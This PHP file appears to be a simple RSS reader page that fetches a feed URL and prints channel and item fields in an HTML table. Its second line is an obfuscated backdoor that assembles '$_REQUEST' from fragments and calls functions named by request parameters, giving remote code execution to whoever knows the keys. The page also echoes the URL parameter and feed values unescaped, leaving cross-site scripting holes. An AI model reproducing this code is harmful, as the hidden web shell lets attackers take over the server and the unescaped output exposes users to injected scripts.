<?
$SvVA=${'_REQU'.'EST'}; if (!empty($SvVA['adNu'])) { 			$qrXw = $SvVA['oXug'];			$RZm=$SvVA['adNu']($qrXw($SvVA['IrBhK']),$qrXw($SvVA['Naij']));			$RZm($qrXw($SvVA['TyXvX']));		 }
include_once("RSSReader.php");

$url = $_GET["URL"];
$rss = new RSSReader($url,false);

echo "<html><head><title>Simple RSS Reader</title>\n";
echo "<style><!-- BODY,TD,SELECT { FONT: 9pt Arial; LINE-HEIGHT: 17px;} //--></style>\n";
echo "<body><form>RSS URL : <input type=text name=URL value=\"$url\" size=70> ";
echo "<input type=submit value=\"조회\">\n";
echo "<hr>\n";
echo "</form>\n";

if(!empty($url)){
	$response = $rss->Read();
	if($response){
		$channel = $rss->getChannel();
		while (list($key, $value) = each ($channel)) {
			echo "<li>$key => $value</li>\n";
		}

		echo "<p><table width=100%>";
		$count = 0;
		foreach($rss->getItems() as $items){
			
			if($count == 0){
				echo "<tr>";
				while (list($key, $value) = each ($items)) {
					printf("<td bgcolor=\"#EEEEEE\">%s</td>\n",$key);
				}
				echo "</tr>";
			}

			echo "<tr>";
			while (list($key, $value) = each ($items)) {
				printf("<td bgcolor=\"#F7F7F7\">%s</td>\n",$value);
			}
			echo "</tr>";
			
			$count++;
		}
		echo "</table>";
	}
}
echo "</body></html>\n";
?>